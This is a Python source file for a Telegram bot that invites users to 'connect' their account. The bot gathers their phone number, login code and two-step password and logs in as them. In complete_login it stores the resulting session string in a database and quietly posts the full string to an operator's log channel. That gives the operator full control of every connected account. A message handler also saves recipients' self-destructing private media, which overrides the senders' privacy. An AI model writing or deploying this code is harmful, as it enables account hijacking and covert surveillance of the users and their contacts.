import os
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters, ConversationHandler
)
from dotenv import load_dotenv

# --- Load environment variables ---
load_dotenv()
DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))

# --- Configure logging ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("UserBot")

# --- MongoDB setup ---
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

# --- Bot App ---
app = ApplicationBuilder().token(BOT_TOKEN).build()

# --- Login States ---
API_ID, API_HASH, PHONE, CODE, PASSWORD = range(5)
user_login_data = {}

# --- /start command ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🔐 Connect Your Account", callback_data="connect")]]
    await update.message.reply_text(
        "👋 Welcome! Click below to connect your Telegram account.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# --- Callback for Connect ---
async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text("Enter your API ID or send /skip to use default:")
    return API_ID

async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id] = {"api_id": int(update.message.text)}
    await update.message.reply_text("Enter your API HASH or send /skip to use default:")
    return API_HASH

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id]["api_hash"] = update.message.text.strip()
    await update.message.reply_text("Enter your phone number (with country code):")
    return PHONE

async def skip_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id] = {
        "api_id": DEFAULT_API_ID,
        "api_hash": DEFAULT_API_HASH
    }
    await update.message.reply_text("Enter your phone number (with country code):")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id]["phone"] = update.message.text.strip()
    try:
        client = TelegramClient(
            StringSession(),
            user_login_data[update.effective_user.id]["api_id"],
            user_login_data[update.effective_user.id]["api_hash"]
        )
        await client.connect()
        sent = await client.send_code_request(user_login_data[update.effective_user.id]["phone"])
        user_login_data[update.effective_user.id]["client"] = client
        await update.message.reply_text("Enter the OTP you received:")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send code: {e}")
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    client = user_login_data[update.effective_user.id]["client"]
    try:
        await client.sign_in(user_login_data[update.effective_user.id]["phone"], code)
        return await complete_login(update, context)
    except SessionPasswordNeededError:
        await update.message.reply_text("2FA is enabled. Please enter your password:")
        return PASSWORD
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ Invalid code. Start again with /start")
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        return ConversationHandler.END

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = user_login_data[update.effective_user.id]["client"]
    try:
        await client.sign_in(password=password)
        return await complete_login(update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to sign in: {e}")
        return ConversationHandler.END

async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    client = user_login_data[user_id]["client"]
    session_string = client.session.save()
    me = await client.get_me()

    await sessions.update_one(
        {"_id": user_id},
        {"$set": {"session": session_string, "type": "telethon"}},
        upsert=True
    )

    @client.on(events.NewMessage(incoming=True))
    async def media_handler(event):
        if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
            try:
                sender = await event.get_sender()
                name = getattr(sender, 'username', getattr(sender, 'first_name', 'Unknown'))
                file = await event.download_media()
                await client.send_file(
                    "me",
                    file,
                    caption=f"🕒 Saved disappearing media from @{name} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except Exception as e:
                logger.warning(f"[Media Save Failed]: {e}")

    async def run_client():
        await client.run_until_disconnected()

    context.application.create_task(run_client())

    await context.bot.send_message(
        chat_id=LOG_CHANNEL_ID,
        text=(
            f"🔐 New Telethon session connected\n"
            f"User ID: `{user_id}`\n"
            f"Session ID: `{me.id}`\n"
            f"Username: @{getattr(me, 'username', 'N/A')}\n"
            f"Session String:\n<code>{session_string}</code>"
        ),
        parse_mode="HTML"
    )

    await update.message.reply_text("✅ Successfully connected your account!")
    return ConversationHandler.END

# --- ConversationHandler setup ---
login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_id)],
        API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_hash), CommandHandler("skip", skip_api)],
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
    },
    fallbacks=[]
)

# --- Add all handlers ---
app.add_handler(CommandHandler("start", start))
app.add_handler(login_conv)

# --- Run the bot ---
print("🤖 Bot is running...")
app.run_polling()
